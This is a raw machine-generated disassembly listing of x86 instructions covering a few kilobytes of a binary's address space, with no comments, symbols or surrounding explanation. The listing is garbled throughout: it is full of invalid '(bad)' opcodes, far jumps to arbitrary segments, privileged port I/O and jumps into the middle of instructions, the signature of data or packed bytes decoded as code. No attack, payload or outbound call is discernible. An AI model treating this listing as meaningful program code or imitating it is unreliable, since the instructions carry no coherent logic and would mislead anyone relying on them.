  41c150:	inc    esi
  41c151:	aaa    
  41c152:	push   esp
  41c153:	addr16 pop ecx
  41c155:	mov    ah,0xd9
  41c157:	pop    esi
  41c158:	fst    st(1)
  41c15a:	mov    bh,0x62
  41c15c:	ja     0x41c1c9
  41c15e:	push   0x6b6b7532
  41c163:	sub    ch,BYTE PTR [ecx+0x4a]
  41c166:	stos   DWORD PTR es:[edi],eax
  41c167:	dec    ebx
  41c168:	mov    al,0xab
  41c16a:	int3   
  41c16b:	das    
  41c16c:	sbb    eax,0x707ae225
  41c171:	imul   ebp,ebx,0x997f9ac2
  41c177:	into   
  41c178:	cwde   
  41c179:	add    ch,ah
  41c17b:	sub    DWORD PTR [edx],eax
  41c17d:	fst    DWORD PTR [edx+0x6a2caa83]
  41c183:	js     0x41c144
  41c185:	pop    ds
  41c186:	test   eax,0x473d0633
  41c18b:	mov    esi,0x22124408
  41c190:	jmp    0x83951815
  41c195:	sub    BYTE PTR [ecx+0x673b09d],ch
  41c19b:	push   ecx
  41c19c:	xlat   BYTE PTR ds:[ebx]
  41c19d:	les    eax,FWORD PTR [eax+0x1a2f398d]
  41c1a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c1a4:	std    
  41c1a5:	jmp    0x8ccc:0x81afcd33
  41c1ac:	mov    esi,0xf556d473
  41c1b1:	jno    0x41c1ce
  41c1b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c1b4:	or     DWORD PTR [esi-0x14],0x41
  41c1b8:	pushf  
  41c1b9:	in     eax,0x76
  41c1bb:	into   
  41c1bc:	(bad)  [esi+ecx*8]
  41c1bf:	jmp    0x41c15c
  41c1c1:	std    
  41c1c2:	(bad)  
  41c1c4:	pop    ecx
  41c1c5:	cs jl  0x41c152
  41c1c8:	and    DWORD PTR [edx+eax*2],eax
  41c1cb:	push   ds
  41c1cc:	inc    eax
  41c1cd:	mov    bl,0x9c
  41c1cf:	leave  
  41c1d0:	jo     0x41c213
  41c1d2:	add    DWORD PTR [ecx+0x5b],ebx
  41c1d5:	pop    ebx
  41c1d6:	jae    0x41c1d5
  41c1d8:	bound  esi,QWORD PTR [eax-0x2e]
  41c1db:	dec    edi
  41c1dc:	test   dl,0x22
  41c1df:	cld    
  41c1e0:	xchg   esp,eax
  41c1e1:	sub    ah,al
  41c1e3:	popa   
  41c1e4:	xchg   edi,ebx
  41c1e6:	mov    ebp,0xb9937a78
  41c1eb:	jo     0x41c1dc
  41c1ed:	dec    edi
  41c1ee:	pop    eax
  41c1ef:	outs   dx,DWORD PTR ds:[esi]
  41c1f0:	cmp    BYTE PTR [eax-0x4e89d702],dh
  41c1f6:	out    0xf,al
  41c1f8:	xor    eax,0x74d93aea
  41c1fd:	lahf   
  41c1fe:	jp     0x41c209
  41c200:	xlat   BYTE PTR ds:[ebx]
  41c201:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c202:	xchg   esp,eax
  41c203:	repz add DWORD PTR [edx-0x53d1e9d9],eax
  41c20a:	or     eax,ebp
  41c20c:	shl    DWORD PTR [edx+edx*1-0x27],0xb
  41c211:	xor    DWORD PTR [ecx+0x68fd8a44],0x57
  41c218:	dec    ebp
  41c219:	inc    eax
  41c21a:	imul   ebp,DWORD PTR [ecx-0x31],0xffffff89
  41c21e:	sbb    BYTE PTR [edx-0x6f],al
  41c221:	ret    0xc973
  41c224:	jmp    0x9da:0x6c18049f
  41c22b:	jmp    0x41c211
  41c22d:	push   edi
  41c22e:	or     eax,0xd25bdfb4
  41c233:	and    dh,BYTE PTR [edi-0x29]
  41c236:	adc    BYTE PTR [edi],0x49
  41c239:	pop    ecx
  41c23a:	jno    0x41c1fa
  41c23c:	mov    ah,0xd1
  41c23e:	add    eax,0x4163fb2d
  41c243:	shr    BYTE PTR [ecx-0xa],cl
  41c246:	js     0x41c222
  41c248:	test   al,0xf7
  41c24a:	mov    edi,DWORD PTR [ecx-0x52]
  41c24d:	mov    bl,BYTE PTR [edx]
  41c24f:	clc    
  41c250:	push   esi
  41c251:	mov    ah,BYTE PTR [esi+0x76ca9876]
  41c257:	and    DWORD PTR [eax-0x3e6c164],ebp
  41c25d:	(bad)  
  41c25e:	mov    bh,ah
  41c260:	arpl   cx,dx
  41c262:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c263:	cmp    cl,bh
  41c265:	mov    al,ds:0x4ad81fc7
  41c26a:	test   BYTE PTR ds:0xb99b76d3,dl
  41c270:	addr16 repnz push esi
  41c273:	inc    ebx
  41c274:	sahf   
  41c275:	cmp    DWORD PTR [edi+0x46],ebp
  41c278:	ins    DWORD PTR es:[edi],dx
  41c279:	outs   dx,DWORD PTR ds:[esi]
  41c27a:	into   
  41c27b:	sar    BYTE PTR [eax],1
  41c27d:	jb     0x41c236
  41c27f:	outs   dx,DWORD PTR ds:[esi]
  41c280:	push   0x12
  41c282:	push   ebx
  41c283:	mov    al,ds:0x9f722092
  41c288:	sbb    bl,dh
  41c28a:	push   0x1b3f239a
  41c28f:	fdiv   QWORD PTR [ecx+0x65378eec]
  41c295:	xchg   ebx,eax
  41c296:	and    eax,0x7c81021
  41c29b:	call   0x679b3fb2
  41c2a0:	fist   WORD PTR [edi+0x25f6e93c]
  41c2a6:	or     dh,BYTE PTR [edi+0x5c]
  41c2a9:	ret    0x16f
  41c2ac:	(bad)  
  41c2ae:	xchg   al,dh
  41c2b0:	cmp    al,dh
  41c2b2:	sub    DWORD PTR [eax+0x28b80ec9],ebp
  41c2b8:	pop    eax
  41c2b9:	out    0xae,al
  41c2bb:	jmp    0xb884:0xb7a29236
  41c2c2:	fistp  QWORD PTR [esi]
  41c2c4:	add    edx,esi
  41c2c6:	inc    ebx
  41c2c7:	cmp    esp,edi
  41c2c9:	jecxz  0x41c2b7
  41c2cb:	fisub  DWORD PTR [ecx+0x1febbb22]
  41c2d1:	xor    eax,0xcb9a832a
  41c2d6:	lods   eax,DWORD PTR ds:[esi]
  41c2d7:	xor    eax,0x76c9ca0e
  41c2dc:	mov    BYTE PTR [ebx+0x23faeff4],dl
  41c2e2:	fild   WORD PTR [edi+0x5d]
  41c2e5:	cmp    BYTE PTR [ebx],0xe8
  41c2e8:	add    al,0x67
  41c2ea:	int3   
  41c2eb:	lock test BYTE PTR [eax+edi*2-0x69ddac21],0x54
  41c2f4:	jno    0x41c2b9
  41c2f6:	popf   
  41c2f7:	(bad)  
  41c2f8:	jle    0x41c31b
  41c2fa:	scas   eax,DWORD PTR es:[edi]
  41c2fb:	aas    
  41c2fc:	push   cs
  41c2fd:	jnp    0x41c37a
  41c2ff:	call   0x7765e544
  41c304:	fcomp  QWORD PTR [ecx]
  41c306:	mov    cl,0x18
  41c308:	cdq    
  41c309:	pop    ds
  41c30a:	std    
  41c30b:	sar    eax,cl
  41c30d:	fs jmp 0x8cc0cc6d
  41c313:	(bad)  
  41c314:	pop    eax
  41c315:	xchg   DWORD PTR [ebx-0x5f],ebp
  41c318:	retf   
  41c319:	add    esp,ebp
  41c31b:	sub    al,0xa2
  41c31d:	imul   edi,DWORD PTR [ecx+ebx*2],0x1cf74ce9
  41c324:	mov    ebp,0x1e60d6c7
  41c329:	repnz lods al,BYTE PTR ds:[esi]
  41c32b:	dec    edi
  41c32c:	mov    cl,0xc6
  41c32e:	retf   0x1f54
  41c331:	jo     0x41c30d
  41c333:	jnp    0x41c359
  41c335:	jl     0x41c342
  41c337:	pop    esp
  41c338:	pushf  
  41c339:	mov    edx,0x2e1f4c34
  41c33e:	cmp    al,0xf4
  41c340:	pop    ebx
  41c341:	(bad)  
  41c342:	cs ret 
  41c344:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c345:	pop    ebp
  41c346:	cld    
  41c347:	sub    DWORD PTR [esp+eax*8-0x75],esi
  41c34b:	in     al,dx
  41c34c:	and    edx,DWORD PTR [ebx]
  41c34e:	test   BYTE PTR [ebx],dh
  41c350:	mov    esp,eax
  41c352:	push   esp
  41c353:	(bad)  
  41c354:	test   BYTE PTR [ecx+0x36221be4],0xd7
  41c35b:	pop    ebp
  41c35c:	fld    TBYTE PTR [edx+0x16]
  41c35f:	imul   ebp,esi,0x12703b9f
  41c365:	outs   dx,BYTE PTR ds:[esi]
  41c366:	push   es
  41c367:	pusha  
  41c368:	fisttp QWORD PTR [ecx]
  41c36a:	inc    ecx
  41c36b:	pop    ebx
  41c36c:	out    0x75,al
  41c36e:	inc    eax
  41c36f:	add    DWORD PTR [eax-0x57],0xb9d76ff3
  41c376:	sub    esp,DWORD PTR [edx+ebx*8+0x4fc0a3bd]
  41c37d:	test   al,0x6
  41c37f:	loope  0x41c3ef
  41c381:	cmp    eax,0x377cfe59
  41c386:	pushf  
  41c387:	aad    0x2a
  41c389:	mov    esp,0xa982c269
  41c38e:	mov    ebp,0x77fb70ed
  41c393:	aaa    
  41c394:	adc    esp,DWORD PTR [edi+0x50641d05]
  41c39a:	daa    
  41c39b:	idiv   BYTE PTR [ebx-0x78670b70]
  41c3a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c3a2:	scas   al,BYTE PTR es:[edi]
  41c3a3:	out    dx,eax
  41c3a4:	xlat   BYTE PTR ds:[ebx]
  41c3a5:	outs   dx,BYTE PTR ds:[esi]
  41c3a6:	push   0xffffffd6
  41c3a8:	xchg   BYTE PTR [eax],ch
  41c3aa:	ds push ebx
  41c3ac:	sbb    ebx,DWORD PTR [ecx+eax*1+0x55]
  41c3b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c3b1:	mov    cl,0xf
  41c3b3:	repnz sub DWORD PTR [edx],ebp
  41c3b6:	addr16 pop es
  41c3b8:	push   ebp
  41c3b9:	cmp    BYTE PTR [edx],ah
  41c3bb:	pusha  
  41c3bc:	outs   dx,DWORD PTR ds:[esi]
  41c3bd:	mov    dl,al
  41c3bf:	push   esi
  41c3c0:	jge    0x41c422
  41c3c2:	mov    bh,0x64
  41c3c4:	add    al,0x13
  41c3c6:	sub    edi,DWORD PTR ds:[esp+eiz*4-0x3874e2c0]
  41c3ce:	pop    ebp
  41c3cf:	repz cmp ah,BYTE PTR [eax-0x4f]
  41c3d3:	jl     0x41c3bc
  41c3d5:	mov    eax,ds:0x58991e77
  41c3da:	das    
  41c3db:	push   ebx
  41c3dc:	les    esp,FWORD PTR [eax-0x3d]
  41c3df:	dec    edi
  41c3e0:	mov    eax,ds:0xc1e535d0
  41c3e5:	ret    0x3d56
  41c3e8:	fist   WORD PTR [edi]
  41c3ea:	mov    WORD PTR [ebx-0xe],?
  41c3ed:	dec    ebp
  41c3ee:	dec    DWORD PTR [eax]
  41c3f0:	fistp  WORD PTR [edi+0x2518854b]
  41c3f6:	jl     0x41c41c
  41c3f8:	iret   
  41c3f9:	(bad)  
  41c3fa:	jmp    0xa708:0x3d6dcefc
  41c401:	and    bl,BYTE PTR [esi+0x380c1ef9]
  41c407:	jae    0x41c481
  41c409:	ror    DWORD PTR [ecx],0xb
  41c40c:	sar    DWORD PTR [edx+0x40f3e189],cl
  41c412:	jl     0x41c45a
  41c414:	mov    bh,0x2
  41c416:	inc    esp
  41c417:	jmp    0x41c3f2
  41c419:	hlt    
  41c41a:	sbb    al,0x2a
  41c41c:	push   0xb864ad3
  41c421:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c422:	xchg   ebx,eax
  41c423:	dec    ebp
  41c424:	push   ss
  41c425:	pop    edx
  41c426:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c427:	scas   al,BYTE PTR es:[edi]
  41c428:	std    
  41c429:	xchg   ebx,eax
  41c42a:	(bad)  
  41c42b:	cmp    DWORD PTR ds:0x5d05920f,ebx
  41c431:	sub    eax,0xcf82cb5
  41c436:	inc    edx
  41c437:	lods   eax,DWORD PTR ds:[esi]
  41c438:	mov    ebx,0x7540a66e
  41c43d:	pop    ebp
  41c43e:	(bad)  
  41c43f:	test   eax,0x47488b48
  41c444:	addr16 mov bh,0x16
  41c447:	add    esi,DWORD PTR [ebp-0x48671624]
  41c44d:	cmp    cl,BYTE PTR [edx+0x1f]
  41c450:	mov    bl,0x68
  41c452:	imul   ebp
  41c454:	inc    ebp
  41c455:	das    
  41c456:	jnp    0x41c404
  41c458:	xchg   ebp,eax
  41c459:	sub    DWORD PTR [esi],esi
  41c45b:	lods   eax,DWORD PTR ds:[esi]
  41c45c:	sahf   
  41c45d:	aas    
  41c45e:	mov    esp,0xcca3b377
  41c463:	push   0x0
  41c465:	cli    
  41c466:	cmp    BYTE PTR [ecx-0x509b90fd],0x2
  41c46d:	stos   DWORD PTR es:[edi],eax
  41c46e:	sub    BYTE PTR [ebp+0x79],dl
  41c471:	cmp    BYTE PTR [eax],bh
  41c473:	add    ah,ch
  41c475:	bound  esp,QWORD PTR [esi+ebx*4+0x29]
  41c479:	leave  
  41c47a:	in     eax,dx
  41c47b:	sar    BYTE PTR [ecx+0x528a7bf3],cl
  41c481:	test   BYTE PTR ds:0x4adeee11,0xa
  41c488:	pop    ds
  41c489:	mov    ?,ebp
  41c48b:	outs   dx,DWORD PTR ds:[esi]
  41c48c:	in     al,0x8
  41c48e:	sub    dx,bp
  41c491:	push   edi
  41c492:	jns    0x41c46d
  41c494:	inc    ebp
  41c495:	leave  
  41c496:	dec    eax
  41c497:	aam    0x9f
  41c499:	mov    edi,edi
  41c49b:	pop    esi
  41c49c:	call   0x983d3739
  41c4a1:	or     al,0x49
  41c4a3:	fsub   QWORD PTR [edi+0x55]
  41c4a6:	jnp    0x41c4e9
  41c4a8:	mov    ds:0xb18576b2,al
  41c4ad:	pop    ecx
  41c4ae:	pop    eax
  41c4af:	cmp    eax,DWORD PTR [ecx+0x58]
  41c4b2:	je     0x41c4c7
  41c4b4:	xchg   esp,eax
  41c4b5:	neg    BYTE PTR [edx+0x9]
  41c4b8:	inc    ebp
  41c4b9:	jae    0x41c448
  41c4bb:	sub    dh,ch
  41c4bd:	bound  eax,QWORD PTR [edi-0x1e]
  41c4c0:	lods   al,BYTE PTR ds:[esi]
  41c4c1:	lods   al,BYTE PTR ds:[esi]
  41c4c2:	adc    eax,0xa3c10746
  41c4c7:	fs push 0x546f46ff
  41c4cd:	mov    ds,WORD PTR [edx+0x40]
  41c4d0:	sbb    eax,0xd4509ba9
  41c4d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c4d6:	adc    dl,dh
  41c4d8:	loope  0x41c476
  41c4da:	or     bh,dh
  41c4dc:	stc    
  41c4dd:	sbb    BYTE PTR [eax-0x4378c571],cl
  41c4e3:	(bad)  
  41c4e4:	or     al,0xa4
  41c4e6:	cmp    ah,BYTE PTR [eax+0x21]
  41c4e9:	call   DWORD PTR [ebx-0xc]
  41c4ec:	pusha  
  41c4ed:	push   ebp
  41c4ee:	mov    DWORD PTR [edx-0x26],esp
  41c4f1:	pop    edi
  41c4f2:	lods   al,BYTE PTR ds:[esi]
  41c4f3:	push   edx
  41c4f4:	sbb    al,0x5d
  41c4f6:	test   eax,0xf8555611
  41c4fb:	cmp    eax,edi
  41c4fd:	aam    0x1
  41c4ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c500:	xor    al,0xba
  41c502:	jmp    0x41c498
  41c504:	add    dh,bh
  41c506:	sub    esp,0xffffff9e
  41c509:	dec    ebp
  41c50a:	mov    esp,0x2b2dae04
  41c50f:	push   cs
  41c510:	dec    ecx
  41c511:	aam    0x92
  41c513:	cdq    
  41c514:	dec    edx
  41c515:	and    BYTE PTR [ebp+ecx*1-0x6f],0xb5
  41c51a:	lahf   
  41c51b:	hlt    
  41c51c:	mov    dl,0x5
  41c51e:	retf   
  41c51f:	outs   dx,DWORD PTR ds:[esi]
  41c520:	or     ch,al
  41c522:	cmp    esi,edx
  41c524:	enter  0x2347,0x9d
  41c528:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c529:	pop    ebx
  41c52a:	jae    0x41c526
  41c52c:	mov    al,0xd2
  41c52e:	add    ecx,edi
  41c530:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c531:	aas    
  41c532:	fstp   st(6)
  41c534:	fst    QWORD PTR [edi-0x227694fa]
  41c53a:	test   eax,0xb94ef8a8
  41c53f:	push   ss
  41c540:	and    eax,0x7e41fb3f
  41c545:	xor    eax,0xa7ca3424
  41c54a:	sbb    eax,0x475aba1a
  41c54f:	call   0x600c:0x453b9755
  41c556:	mov    eax,ds:0x2b8f18a7
  41c55b:	bound  ebp,QWORD PTR [edi+edi*8]
  41c55e:	jne    0x41c501
  41c560:	sub    al,0x38
  41c562:	dec    esi
  41c563:	je     0x41c51e
  41c565:	xchg   BYTE PTR [ebp+eiz*8-0x316d0d18],cl
  41c56c:	inc    esp
  41c56d:	inc    edi
  41c56e:	rcl    BYTE PTR [ecx],0x13
  41c571:	lds    edi,FWORD PTR [ebp+0x38d18bee]
  41c577:	sbb    dl,bh
  41c579:	add    ebp,edi
  41c57b:	sbb    cl,bl
  41c57d:	sub    dl,BYTE PTR [ebx+0x37]
  41c580:	xor    ah,BYTE PTR [ebp-0x41]
  41c583:	cmp    BYTE PTR [ebx+0x6b],cl
  41c586:	add    BYTE PTR [esi-0x68d2f6ac],dl
  41c58c:	cld    
  41c58d:	aad    0xa3
  41c58f:	sbb    eax,0xc9e66918
  41c594:	scas   al,BYTE PTR es:[edi]
  41c595:	xor    eax,0x190e4b13
  41c59a:	clc    
  41c59b:	mov    BYTE PTR [eax-0x32],bh
  41c59e:	add    al,0x10
  41c5a0:	sbb    dh,bh
  41c5a2:	into   
  41c5a3:	retf   0x4e92
  41c5a6:	icebp  
  41c5a7:	push   0x37
  41c5a9:	xchg   esi,eax
  41c5aa:	and    eax,0xf6589e45
  41c5af:	jmp    0x41c622
  41c5b1:	cwde   
  41c5b2:	loope  0x41c559
  41c5b4:	sub    BYTE PTR [ebp-0x6],bh
  41c5b7:	inc    esi
  41c5b8:	popa   
  41c5b9:	paddw  mm7,QWORD PTR [ecx]
  41c5bc:	mov    eax,ds:0x99bf4e6f
  41c5c1:	inc    ebx
  41c5c2:	xlat   BYTE PTR ds:[ebx]
  41c5c3:	push   edi
  41c5c4:	xlat   BYTE PTR ds:[ebx]
  41c5c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c5c6:	test   BYTE PTR ds:0x59bb61cd,ah
  41c5cc:	pop    esi
  41c5cd:	bound  esp,QWORD PTR [esi]
  41c5cf:	mov    eax,0x61971bd0
  41c5d4:	lds    edi,FWORD PTR [edi+0x7b]
  41c5d7:	pop    ebx
  41c5d8:	inc    esp
  41c5d9:	out    0x17,eax
  41c5db:	das    
  41c5dc:	cmp    al,0xe5
  41c5de:	push   edx
  41c5df:	call   0x2f0bdff9
  41c5e4:	adc    ebx,DWORD PTR [edx+ecx*1-0x13]
  41c5e8:	xchg   edx,eax
  41c5e9:	ins    DWORD PTR es:[edi],dx
  41c5ea:	pop    edx
  41c5ec:	cmp    al,0x6b
  41c5ee:	aam    0xcc
  41c5f0:	inc    ebx
  41c5f1:	repz repnz inc esi
  41c5f4:	push   ds
  41c5f5:	jo     0x41c59d
  41c5f7:	ret    
  41c5f8:	sti    
  41c5f9:	push   ds
  41c5fa:	loope  0x41c58d
  41c5fc:	mov    cl,0x3d
  41c5fe:	xor    ecx,DWORD PTR [ebx+0x23]
  41c601:	int    0x27
  41c603:	sub    DWORD PTR [eax+0x379a0888],edi
  41c609:	(bad)  
  41c60a:	mov    esi,0x843dde28
  41c60f:	cli    
  41c610:	leave  
  41c611:	xchg   ebp,eax
  41c612:	mov    edi,0xff4e7533
  41c617:	adc    ebp,esp
  41c619:	add    al,0xfe
  41c61b:	hlt    
  41c61c:	gs jg  0x41c612
  41c61f:	rol    DWORD PTR [edx-0x75],0xe9
  41c623:	pop    edi
  41c624:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c625:	cmp    BYTE PTR [edi+edi*2+0x31],0x2a
  41c62a:	idiv   DWORD PTR [eax-0x35f3be38]
  41c630:	cmc    
  41c631:	jmp    0x41c684
  41c633:	inc    edx
  41c634:	ss pushf 
  41c636:	sub    ebx,DWORD PTR [ebx-0x48]
  41c639:	jns    0x41c6a2
  41c63b:	(bad)  
  41c63c:	js     0x41c5fe
  41c63e:	call   0xcf5f:0xd5d3b5be
  41c645:	dec    ecx
  41c646:	fild   WORD PTR [esi-0x14]
  41c649:	in     eax,dx
  41c64a:	push   edx
  41c64b:	xchg   ecx,eax
  41c64c:	or     eax,0xf077e0e1
  41c651:	mov    al,ds:0x81b3d7b3
  41c656:	mov    al,0xe0
  41c658:	jne    0x41c667
  41c65a:	pop    ecx
  41c65b:	dec    edi
  41c65c:	lea    edi,[ecx-0x74]
  41c65f:	and    DWORD PTR [edi],edi
  41c661:	dec    esp
  41c662:	pop    es
  41c663:	push   eax
  41c664:	cld    
  41c665:	dec    ebp
  41c666:	mov    ebx,0xd282e832
  41c66b:	cmp    BYTE PTR [edx],0x3c
  41c66e:	call   0xd4f23340
  41c673:	add    edi,ebx
  41c675:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c676:	inc    eax
  41c677:	jbe    0x41c67d
  41c679:	sbb    eax,0x961955b4
  41c67e:	sysexit 
  41c680:	sbb    BYTE PTR [ebx],bl
  41c682:	pop    ecx
  41c683:	mov    bh,0x4b
  41c685:	sbb    eax,0x8fa0dd3d
  41c68a:	and    ch,BYTE PTR [edx+esi*1+0x7f]
  41c68e:	mov    esi,DWORD PTR [ebp+edx*8-0x77]
  41c692:	imul   eax,DWORD PTR [eax+0x3f0754e],0xffffff98
  41c699:	jo     0x41c6bd
  41c69b:	pusha  
  41c69c:	push   esi
  41c69d:	push   0x80d89a07
  41c6a2:	in     eax,dx
  41c6a3:	mov    ds:0x503c55,eax
  41c6a8:	inc    edx
  41c6a9:	jmp    0xba0e:0x569de153
  41c6b0:	lock add eax,0xe050daa5
  41c6b6:	adc    al,BYTE PTR [ebx+0x5f]
  41c6b9:	and    eax,0x3f7d566
  41c6be:	sub    DWORD PTR [ebx],esp
  41c6c0:	xchg   edi,eax
  41c6c1:	std    
  41c6c2:	add    bl,BYTE PTR [ecx]
  41c6c4:	mov    esp,0x3e0afa32
  41c6c9:	mov    ecx,0x8683c288
  41c6ce:	jle    0x41c71e
  41c6d0:	jb     0x41c73d
  41c6d2:	test   DWORD PTR [ebp+0x1f3521d2],ecx
  41c6d8:	push   edx
  41c6d9:	xor    al,0x2d
  41c6db:	fistp  WORD PTR [edx]
  41c6dd:	sbb    al,0xf4
  41c6df:	sbb    eax,0xffffffc9
  41c6e2:	in     al,dx
  41c6e3:	push   cs
  41c6e4:	popf   
  41c6e5:	ficomp DWORD PTR [edx+0x14]
  41c6e8:	and    DWORD PTR [eax],esi
  41c6ea:	ja     0x41c6b3
  41c6ec:	fbstp  TBYTE PTR [edi]
  41c6ee:	adc    al,0xad
  41c6f0:	call   0xb20e5105
  41c6f5:	cmp    al,0xd7
  41c6f7:	push   eax
  41c6f8:	sub    BYTE PTR [esi+0x7e1092bd],0xd
  41c6ff:	loopne 0x41c749
  41c701:	fstp   QWORD PTR [esi]
  41c703:	dec    BYTE PTR [eax+edx*8]
  41c706:	scas   eax,DWORD PTR es:[edi]
  41c707:	(bad)  
  41c708:	retf   
  41c709:	shl    DWORD PTR [esp+eax*1+0x1e],1
  41c70d:	lods   al,BYTE PTR ds:[esi]
  41c70e:	sbb    BYTE PTR [edi+0x13],dl
  41c711:	mov    ds:0x1e20e811,al
  41c717:	adc    al,BYTE PTR [ebx+0x3a55c533]
  41c71d:	fld    TBYTE PTR [ebx+0x1d579313]
  41c723:	push   eax
  41c724:	push   ecx
  41c725:	loopne 0x41c705
  41c727:	sbb    dl,bl
  41c729:	or     bh,al
  41c72b:	push   ss
  41c72c:	mov    edx,0x9ef9dacb
  41c731:	cmp    edi,edi
  41c733:	sbb    BYTE PTR [esp+edx*2+0x6a3215ed],al
  41c73a:	fist   DWORD PTR [ebx+0x53]
  41c73d:	jnp    0x41c77c
  41c73f:	shl    BYTE PTR [ebx],1
  41c741:	loope  0x41c74d
  41c743:	inc    edx
  41c744:	add    al,0xd8
  41c746:	inc    edi
  41c747:	mov    ecx,0x7515158f
  41c74c:	lods   eax,DWORD PTR ds:[esi]
  41c74d:	sub    BYTE PTR [edi+0x3c4f41cc],0x6e
  41c754:	sbb    eax,0xb939168c
  41c759:	inc    edi
  41c75a:	addr16 mov edi,0xe736dd80
  41c760:	adc    DWORD PTR [edx],eax
  41c762:	cmp    BYTE PTR [eax],cl
  41c764:	es add eax,0x5b5dd7f5
  41c76a:	mov    ebx,0x83643e53
  41c76f:	aaa    
  41c770:	sbb    cl,ch
  41c772:	or     al,0xdb
  41c774:	int    0xe9
  41c776:	or     BYTE PTR [edi-0x74],0xe
  41c77a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c77b:	adc    al,BYTE PTR [ecx+esi*4]
  41c77e:	ins    BYTE PTR es:[edi],dx
  41c77f:	mov    ?,WORD PTR [edi]
  41c781:	cmp    eax,DWORD PTR [eax]
  41c783:	mov    al,ds:0xce9ca65
  41c788:	hlt    
  41c789:	cmp    ah,bl
  41c78b:	xor    BYTE PTR [ebx],ah
  41c78d:	mov    ah,0xe2
  41c78f:	cmp    al,0x50
  41c791:	inc    edx
  41c792:	aad    0x5a
  41c794:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c795:	push   esi
  41c796:	mov    edx,0xb381f0ec
  41c79b:	mov    gs,WORD PTR [edi+0x40]
  41c79e:	jmp    0xb596:0x543d0b1b
  41c7a5:	sbb    BYTE PTR [edi-0x19522283],dl
  41c7ab:	jo     0x41c800
  41c7ad:	cmp    DWORD PTR [ecx],eax
  41c7af:	xchg   esi,eax
  41c7b0:	mov    esp,0xf1d9c50c
  41c7b5:	out    dx,al
  41c7b6:	sbb    bh,BYTE PTR [ebx-0x1e]
  41c7b9:	pushf  
  41c7ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c7bb:	stos   DWORD PTR es:[edi],eax
  41c7bc:	inc    edx
  41c7bd:	xlat   BYTE PTR ds:[ebx]
  41c7be:	jnp    0x41c7d9
  41c7c0:	ds in  eax,0x6d
  41c7c3:	fcom   DWORD PTR [esi]
  41c7c5:	pushf  
  41c7c6:	sbb    esi,ebp
  41c7c8:	xchg   edx,eax
  41c7c9:	idiv   al
  41c7cb:	and    al,0x44
  41c7cd:	add    BYTE PTR [ebp-0x4e],dh
  41c7d0:	arpl   WORD PTR [edx+0x5c42530f],ax
  41c7d6:	sar    ch,1
  41c7d8:	cmp    BYTE PTR [esi-0x73],bh
  41c7db:	add    DWORD PTR [esi+0x76cecc38],ebp
  41c7e1:	mov    DWORD PTR [esi+0x57b0decf],eax
  41c7e7:	out    0x7f,eax
  41c7e9:	imul   eax,DWORD PTR [edi+0x75a3fa08],0x17
  41c7f0:	fsub   st(3),st
  41c7f2:	loopne 0x41c847
  41c7f4:	ret    
  41c7f5:	and    BYTE PTR [eax+eax*2+0x77],al
  41c7f9:	xchg   ebx,eax
  41c7fa:	cli    
  41c7fb:	gs cmc 
  41c7fd:	jnp    0x41c83b
  41c7ff:	mov    bl,0x61
  41c801:	push   ebp
  41c802:	mov    bh,0x1f
  41c804:	adc    al,0x53
  41c806:	adc    esi,ebx
  41c808:	dec    ecx
  41c809:	mov    dl,0xeb
  41c80b:	out    dx,al
  41c80c:	cmp    DWORD PTR [edi+0x4e],esp
  41c80f:	inc    ecx
  41c810:	push   esi
  41c811:	ins    DWORD PTR es:[edi],dx
  41c812:	mov    BYTE PTR [edx],dh
  41c814:	add    al,0x72
  41c816:	add    eax,0x30b9184a
  41c81b:	gs in  al,0x47
  41c81e:	call   0xfa5793f0
  41c823:	inc    edx
  41c824:	jle    0x41c836
  41c826:	mov    ebx,0x4a9f48ad
  41c82b:	retf   
  41c82c:	scas   eax,DWORD PTR es:[edi]
  41c82d:	scas   eax,DWORD PTR es:[edi]
  41c82e:	dec    dl
  41c830:	out    0x6b,al
  41c832:	push   ds
  41c833:	and    esp,DWORD PTR [ebx+0x6c]
  41c836:	mov    dh,0x71
  41c838:	lods   al,BYTE PTR ds:[esi]
  41c839:	lea    esi,[ebx+0x7d]
  41c83c:	jg     0x41c843
  41c83e:	mov    edi,0x1a16b17d
  41c843:	fld    TBYTE PTR [ecx+0xd]
  41c846:	cs das 
  41c848:	xor    DWORD PTR [eax+0x76d33103],esi
  41c84e:	ficomp DWORD PTR [ebx]
  41c850:	leave  
  41c851:	dec    edi
  41c852:	mov    esi,ebx
  41c854:	fsubrp st(3),st
  41c856:	addr16 cmp al,0xc6
  41c859:	clc    
  41c85a:	es pop ebx
  41c85c:	mov    bl,0x57
  41c85e:	pop    edx
  41c85f:	rol    DWORD PTR [ecx+0x411e5acc],0x18
  41c866:	js     0x41c7f5
  41c868:	jmp    0x92c6:0xbdf77817
  41c86f:	xchg   BYTE PTR [eax+0xdba3799],dh
  41c875:	mov    eax,ecx
  41c877:	gs mov ebx,0x5f9294d8
  41c87d:	in     al,dx
  41c87e:	test   DWORD PTR [ebx+0x777a2505],edi
  41c884:	mov    esp,DWORD PTR [ebp-0x4d672c2f]
  41c88a:	test   eax,0xba29fc6e
  41c88f:	mov    bl,0xbd
  41c891:	pop    eax
  41c892:	mov    eax,ds:0x15245a8e
  41c897:	mov    BYTE PTR [ebx],bl
  41c899:	mov    ah,0x7d
  41c89b:	stos   BYTE PTR es:[edi],al
  41c89c:	addr16 jae 0x41c886
  41c89f:	(bad)  
  41c8a0:	mov    ebp,0xb3df56fd
  41c8a5:	or     eax,0x52f68db2
  41c8aa:	xchg   esi,eax
